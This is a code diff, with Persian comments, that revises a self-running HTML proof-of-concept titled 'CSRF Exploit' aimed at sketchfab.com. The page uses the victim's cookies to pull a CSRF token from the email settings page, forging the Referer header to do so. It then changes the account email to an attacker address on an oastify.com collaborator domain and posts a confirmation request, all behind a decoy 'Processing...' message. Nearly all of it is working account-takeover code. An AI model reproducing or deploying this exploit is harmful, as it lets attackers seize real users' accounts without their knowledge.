@@ -1,54 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit (XHR)</title>
+    <title>CSRF Exploit (Fetch for GET, XHR for POSTs)</title>
 </head>
 <body>
     <h1>Processing...</h1>
     <p id="status">Initializing...</p>
 
     <script>
-        // تابع کمکی برای تأخیر
+        // تأخیر
         function delay(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // تابع برای اجرای درخواست GET با XHR و استخراج sb_csrftoken از Set-Cookie
-        function extractCsrfTokenFromSetCookie() {
-            return new Promise((resolve, reject) => {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://sketchfab.com/settings/email', true);
-                xhr.withCredentials = true;  // ارسال کوکی‌ها
-                xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml');
-
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === XMLHttpRequest.DONE) {
-                        if (xhr.status === 200) {
-                            // دریافت هدر Set-Cookie
-                            const setCookieHeader = xhr.getResponseHeader('set-cookie');
-                            if (!setCookieHeader) {
-                                reject(new Error('Set-Cookie header not found in response'));
-                                return;
-                            }
-                            // استخراج sb_csrftoken با رجکس
-                            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
-                            if (match && match[1]) {
-                                resolve(match[1]);
-                                console.log(match);
-                            } else {
-                                reject(new Error('sb_csrftoken not found in Set-Cookie header'));
-                            }
-                        } else {
-                            reject(new Error(`GET request failed with status ${xhr.status}`));
-                        }
-                    }
-                };
-                xhr.onerror = () => reject(new Error('Network error on GET request'));
-                xhr.send();
+        // ------------------------------------------
+        // درخواست اول: GET با fetch و تنظیم Referer
+        // ------------------------------------------
+        async function extractCsrfTokenFromSetCookie() {
+            const url = 'https://sketchfab.com/settings/email';
+            const response = await fetch(url, {
+                method: 'GET',
+                credentials: 'include',      // ارسال کوکی‌ها
+                referrer: 'https://sketchfab.com/settings/profile',  // تنظیم Referer دلخواه
+                referrerPolicy: 'unsafe-url', // اجازه ارسال Referer کامل
+                headers: {
+                    'Accept': 'text/html,application/xhtml+xml'
+                }
             });
+
+            if (!response.ok) {
+                throw new Error(`GET failed with status ${response.status}`);
+            }
+
+            // دریافت هدر Set-Cookie
+            const setCookieHeader = response.headers.get('set-cookie');
+            if (!setCookieHeader) {
+                throw new Error('Set-Cookie header not found');
+            }
+
+            // استخراج sb_csrftoken
+            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
+            if (!match || !match[1]) {
+                throw new Error('sb_csrftoken not found in Set-Cookie');
+            }
+            return match[1];
         }
 
-        // تابع برای درخواست POST اول (تغییر ایمیل)
+        // ------------------------------------------
+        // درخواست دوم: POST تغییر ایمیل (XHR)
+        // ------------------------------------------
         function changeEmail(csrfToken, emailAddress) {
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
@@ -61,27 +61,24 @@
                     if (xhr.readyState === XMLHttpRequest.DONE) {
                         if (xhr.status === 200) {
                             try {
-                                const response = JSON.parse(xhr.responseText);
-                                if (response.success === true) {
-                                    resolve(true);
-                                } else {
-                                    reject(new Error('Response success is false'));
-                                }
-                            } catch (e) {
-                                reject(new Error('Invalid JSON response'));
-                            }
+                                const resp = JSON.parse(xhr.responseText);
+                                if (resp.success === true) resolve(true);
+                                else reject(new Error('success=false'));
+                            } catch(e) { reject(e); }
                         } else {
-                            reject(new Error(`POST changeEmail failed with status ${xhr.status}`));
+                            reject(new Error(`POST1 status ${xhr.status}`));
                         }
                     }
                 };
-                xhr.onerror = () => reject(new Error('Network error on changeEmail'));
+                xhr.onerror = () => reject(new Error('Network error in changeEmail'));
                 const payload = JSON.stringify({ email: emailAddress });
                 xhr.send(payload);
             });
         }
 
-        // تابع برای درخواست POST دوم (تایید از طریق epic)
+        // ------------------------------------------
+        // درخواست سوم: POST تایید (XHR)
+        // ------------------------------------------
         function confirmEmail(csrfToken) {
             return new Promise((resolve, reject) => {
                 const xhr = new XMLHttpRequest();
@@ -91,18 +88,15 @@
 
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === XMLHttpRequest.DONE) {
-                        // ریدایرکت 302 توسط XHR خودکار دنبال می‌شود، بنابراین status نهایی 200 خواهد بود
-                        // اگر به دامنه دیگری ریدایرکت شود و CORS مانع شود، خطا می‌دهد.
-                        // در اینجا هر status 2xx یا حتی 302 (اگر ریدایرکت کامل نشود) را موفق در نظر می‌گیریم.
+                        // ریدایرکت 302 توسط XHR خودکار دنبال می‌شود
                         if (xhr.status >= 200 && xhr.status < 400) {
                             resolve(true);
                         } else {
-                            reject(new Error(`POST confirmEmail failed with status ${xhr.status}`));
+                            reject(new Error(`POST2 status ${xhr.status}`));
                         }
                     }
                 };
-                xhr.onerror = () => reject(new Error('Network error on confirmEmail'));
-
+                xhr.onerror = () => reject(new Error('Network error in confirmEmail'));
                 const params = new URLSearchParams({
                     'csrfmiddlewaretoken': csrfToken,
                     'next': '/settings/email/sso-verify-callback'
@@ -111,11 +105,13 @@
             });
         }
 
-        // اجرای اصلی زنجیره
+        // ------------------------------------------
+        // اجرای اصلی
+        // ------------------------------------------
         (async function() {
             try {
                 const statusDiv = document.getElementById('status');
-                statusDiv.innerText = 'Extracting CSRF token from Set-Cookie header...';
+                statusDiv.innerText = 'Extracting CSRF token via fetch (with Referer)...';
                 const csrfToken = await extractCsrfTokenFromSetCookie();
                 console.log('[+] CSRF token extracted:', csrfToken);
                 statusDiv.innerText = 'Token extracted. Sending email change request...';
@@ -123,7 +119,7 @@
                 // آدرس ایمیل جدید همراه با Collaborator خود را جایگزین کنید
                 const emailAddress = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 تغییر دهید
                 await changeEmail(csrfToken, emailAddress);
-                console.log('[+] Email change request sent successfully');
+                console.log('[+] Email change request sent');
                 statusDiv.innerText = 'Email change initiated. Waiting 2 seconds...';
                 await delay(2000);
 
